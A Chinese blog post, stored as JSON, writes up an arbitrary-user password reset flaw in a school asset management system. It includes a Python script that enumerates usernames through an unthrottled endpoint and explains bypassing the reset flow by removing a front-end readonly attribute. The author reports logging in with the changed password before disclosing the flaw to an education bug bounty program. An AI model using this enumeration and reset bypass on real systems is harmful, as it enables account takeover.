{"title":"记一次任意用户密码修改漏洞","uid":"bd1e536e6f629d63f249e64bcb6082d0","slug":"change-any-user-passwd","date":"2020-07-28T06:45:41.000Z","updated":"2023-08-27T14:43:21.187Z","comments":true,"path":"api/articles/change-any-user-passwd.json","keywords":null,"cover":"https://images.unsplash.com/photo-1691522949910-28fcfb326904?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwxfDB8MXxyYW5kb218MHx8fHx8fHx8MTY5MzE0NzIwMQ&ixlib=rb-4.0.3&q=80&w=1080","content":"<p>这是一个学校的固定资产管理系统登录页面，尝试几个弱口令未遂，发现有验证码，爆破不是很有可能，决定从前端分析(迁移博客，图片丢失～)  </p>\n<p>当在输入工号后点击其它地方，前端会默认发送一个验证是否有该用户名的请求，服务端会返回一个json数据，code为0用户名不存在，为1表示该用户名存在，并且发现该接口没有任何限制  </p>\n<p>于是写了一个脚本爆破用户名，用户名规律：年份+三位数字  </p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">import requests\nurl&#x3D;&#39;http:&#x2F;&#x2F;xxxx&#x2F;ZCGL&#x2F;login&#x2F;checkUsername&#39;\nyear&#x3D;1990\nfor i in range(year,2020):\n    for a in range(0,9):\n        for b in range(0,9):\n            for c in range(0,9):\n                username&#x3D;str(i)+str(a)+str(b)+str(c)\n                dat&#x3D;&#123;&#39;username&#39;:username,&#39;method&#39;:&#39;1,2&#39;&#125;\n                res&#x3D;requests.post(url,dat)\n                if(eval(res.text)[&#39;code&#39;]&#x3D;&#x3D;&#39;1&#39;):\n                    print(username+&#39;存在&#39;)</code></pre>\n<p>有了用户名之后我们在继续往下看，尝试在密保问题和答案处输入随机内容，直接点验证，发现没有任何反应，这应该是服务端没有开启验证吧。。。。但是这时新密码处不能输入，这一看肯定是个前端限制啊，于是乎直接F12删除readonly属性，新密码直接可以输了  </p>\n<p>最后直接点确定，密码修改成功，登录，登上去看了一下，因为是学校网站，不敢多搞，没有深入，直接提交教育src  </p>\n","text":"这是一个学校的固定资产管理系统登录页面，尝试几个弱口令未遂，发现有验证码，爆破不是很有可能，决定从前端分析(迁移博客，图片丢失～) 当在输入工号后点击其它地方，...","link":"","photos":[],"count_time":{"symbolsCount":923,"symbolsTime":"1 mins."},"categories":[{"name":"安全","slug":"安全","count":7,"path":"api/categories/安全.json"},{"name":"web","slug":"安全/web","count":1,"path":"api/categories/安全/web.json"},{"name":"web","slug":"web","count":1,"path":"api/categories/web.json"}],"tags":[{"name":"web漏洞","slug":"web漏洞","count":1,"path":"api/tags/web漏洞.json"}],"toc":"","author":{"name":"Pa2sw0rd","slug":"blog-author","avatar":"http://static.pa2sw0rd.cn/static/images/pa2sw0rd.webp","link":"/","description":"一位正在重塑知识的技术人 <br /> @ <b>公众号：Pa2sw0rd</b>","socials":{"github":"https://github.com/Pa2sw0rd","twitter":"https://twitter.com/pa2sword","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"bilibili":{"icon":"/svg/bilibili.svg","link":"https://live.bilibili.com/22619211"},"douyin":{"icon":"/svg/douyin.svg","link":"https://www.douyin.com/user/MS4wLjABAAAA-Ohh-uecs-fV_2dHQpkNPD8KUHel_Mzuok9jyxBAJmM"}}}},"mapped":true,"hidden":false,"prev_post":{"title":"温湿度数据可视化","uid":"b9dfc951b7f818ca7902fed80877a28b","slug":"tmp-hum-visualization","date":"2020-07-29T10:06:16.000Z","updated":"2023-08-27T14:58:26.886Z","comments":true,"path":"api/articles/tmp-hum-visualization.json","keywords":null,"cover":"https://images.unsplash.com/photo-1451187580459-43490279c0fa?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwxfDB8MXxyYW5kb218MHx8aW90fHx8fHx8MTY5MzE0Nzk2Nw&ixlib=rb-4.0.3&q=80&utm_campaign=api-credit&utm_medium=referral&utm_source=unsplash_source&w=1080","text":"这是一个帮一个学姐完善的毕业设计，由于她之前找人做的时候一次性付清了钱，导致后来导师要求加功能的时候卖家不理人，所以有了此文章(博客迁移，图不见了～)，来说一下...","link":"","photos":[],"count_time":{"symbolsCount":"17k","symbolsTime":"16 mins."},"categories":[{"name":"开发","slug":"开发","count":4,"path":"api/categories/开发.json"},{"name":"硬件","slug":"开发/硬件","count":2,"path":"api/categories/开发/硬件.json"},{"name":"硬件","slug":"硬件","count":2,"path":"api/categories/硬件.json"},{"name":"数据可视化","slug":"开发/数据可视化","count":1,"path":"api/categories/开发/数据可视化.json"},{"name":"物联网","slug":"硬件/物联网","count":1,"path":"api/categories/硬件/物联网.json"}],"tags":[{"name":"C#","slug":"C","count":2,"path":"api/tags/C.json"},{"name":"物联网","slug":"物联网","count":1,"path":"api/tags/物联网.json"},{"name":"数据可视化","slug":"数据可视化","count":1,"path":"api/tags/数据可视化.json"},{"name":"echarts","slug":"echarts","count":1,"path":"api/tags/echarts.json"}],"author":{"name":"Pa2sw0rd","slug":"blog-author","avatar":"http://static.pa2sw0rd.cn/static/images/pa2sw0rd.webp","link":"/","description":"一位正在重塑知识的技术人 <br /> @ <b>公众号：Pa2sw0rd</b>","socials":{"github":"https://github.com/Pa2sw0rd","twitter":"https://twitter.com/pa2sword","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"bilibili":{"icon":"/svg/bilibili.svg","link":"https://live.bilibili.com/22619211"},"douyin":{"icon":"/svg/douyin.svg","link":"https://www.douyin.com/user/MS4wLjABAAAA-Ohh-uecs-fV_2dHQpkNPD8KUHel_Mzuok9jyxBAJmM"}}}}},"next_post":{"title":"用永恒之蓝（MS17-010）对校园网进行渗透测试","uid":"a8cc9a7e29f68e770cf685748e427dea","slug":"school-network-ms17010-pentest","date":"2018-10-23T11:59:26.000Z","updated":"2023-08-27T15:15:28.192Z","comments":true,"path":"api/articles/school-network-ms17010-pentest.json","keywords":null,"cover":"https://images.unsplash.com/photo-1514168757508-07ffe9ae125b?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwxfDB8MXxyYW5kb218MHx8aGFja2VyfHx8fHx8MTY5MzE0OTA2Mw&ixlib=rb-4.0.3&q=80&utm_campaign=api-credit&utm_medium=referral&utm_source=unsplash_source&w=1080","text":"漏洞描述：通过扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖...","link":"","photos":[],"count_time":{"symbolsCount":"1.1k","symbolsTime":"1 mins."},"categories":[{"name":"安全","slug":"安全","count":7,"path":"api/categories/安全.json"},{"name":"渗透测试","slug":"安全/渗透测试","count":2,"path":"api/categories/安全/渗透测试.json"},{"name":"渗透测试","slug":"渗透测试","count":2,"path":"api/categories/渗透测试.json"},{"name":"校园网","slug":"渗透测试/校园网","count":1,"path":"api/categories/渗透测试/校园网.json"}],"tags":[{"name":"渗透测试","slug":"渗透测试","count":2,"path":"api/tags/渗透测试.json"},{"name":"永恒之蓝","slug":"永恒之蓝","count":1,"path":"api/tags/永恒之蓝.json"},{"name":"校园网","slug":"校园网","count":1,"path":"api/tags/校园网.json"}],"author":{"name":"Pa2sw0rd","slug":"blog-author","avatar":"http://static.pa2sw0rd.cn/static/images/pa2sw0rd.webp","link":"/","description":"一位正在重塑知识的技术人 <br /> @ <b>公众号：Pa2sw0rd</b>","socials":{"github":"https://github.com/Pa2sw0rd","twitter":"https://twitter.com/pa2sword","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"bilibili":{"icon":"/svg/bilibili.svg","link":"https://live.bilibili.com/22619211"},"douyin":{"icon":"/svg/douyin.svg","link":"https://www.douyin.com/user/MS4wLjABAAAA-Ohh-uecs-fV_2dHQpkNPD8KUHel_Mzuok9jyxBAJmM"}}}}}}